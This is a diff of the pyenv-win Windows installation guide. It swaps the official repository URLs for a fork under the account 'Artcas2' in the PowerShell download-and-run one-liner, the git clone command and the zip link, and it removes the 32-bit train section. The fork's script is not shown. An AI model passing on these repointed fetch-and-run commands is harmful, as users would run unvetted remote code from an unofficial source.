@@ -21,7 +21,7 @@ _NOTE:_ If you are running Windows 10 1905 or newer, you might need to disable t
 The easiest way to install pyenv-win is to run the following installation command in a PowerShell terminal:
 
 ```pwsh
-Invoke-WebRequest -UseBasicParsing -Uri "https://raw.githubusercontent.com/pyenv-win/pyenv-win/master/pyenv-win/install-pyenv-win.ps1" -OutFile "./install-pyenv-win.ps1"; &"./install-pyenv-win.ps1"
+Invoke-WebRequest -UseBasicParsing -Uri "https://raw.githubusercontent.com/Artcas2/pyenv-win/master/pyenv-win/install-pyenv-win.ps1" -OutFile "./install-pyenv-win.ps1"; &"./install-pyenv-win.ps1"
 ```
 
 If you are getting any **UnauthorizedAccess** error as below then start Windows PowerShell with the "Run as administrator" option and run `Set-ExecutionPolicy -ExecutionPolicy RemoteSigned -Scope LocalMachine`, now re-run the above installation command.
@@ -50,7 +50,7 @@ The default way to install pyenv-win, it needs git commands you need to install 
 
 If you are using PowerShell or Git Bash use `$HOME` instead of `%USERPROFILE%`
 
-git clone using command prompt `git clone https://github.com/pyenv-win/pyenv-win.git "%USERPROFILE%\.pyenv"`
+git clone using command prompt `git clone https://github.com/Artcas2/pyenv-win.git "%USERPROFILE%\.pyenv"`
 
 steps to [add System Settings](#add-system-settings)
 
@@ -68,7 +68,7 @@ Manual installation steps for pyenv-win
 
 If you are using PowerShell or Git Bash use `$HOME` instead of `%USERPROFILE%`
 
-1. Download [pyenv-win.zip](https://github.com/pyenv-win/pyenv-win/archive/master.zip)
+1. Download [pyenv-win.zip](https://github.com/Artcas2/pyenv-win/archive/master.zip)
 
 2. Create a `.pyenv` directory using command prompt `mkdir %USERPROFILE%/.pyenv` if not exist
 
@@ -175,22 +175,5 @@ echo 'export PATH="$HOME/.pyenv/pyenv-win/bin:$PATH"' >> ~/.bash_profile
 ```
 
 Open a new terminal, and confirm `pyenv --version` works.
-
-***
-
-## **How to use 32-train**
-
-- **Using Git**
-  1. For 32-train prerequisite is [installing pyenv-win using Git](#git-commands)
-  2. Go to .pyenv dir command `cd %USERPROFILE%\.pyenv`
-  3. run `git checkout -b 32bit-train origin/32bit-train`
-  4. run `pyenv --version` and you should see _2.32.x_
-- **Using pip**
-  1. run `pip install pyenv-win==2.32.x --target %USERPROFILE%\.pyenv`
-  2. steps to [add System Settings](#add-system-settings)
-- **Using Zip**
-  1. Download [pyenv-win.zip](https://github.com/pyenv-win/pyenv-win/archive/32bit-train.zip)
-  2. Follow step 2 from [Pyenv-win zip](#pyenv-win-zip)
-  3. steps to [add System Settings](#add-system-settings)
 
 Return to [README](../README.md#installation)
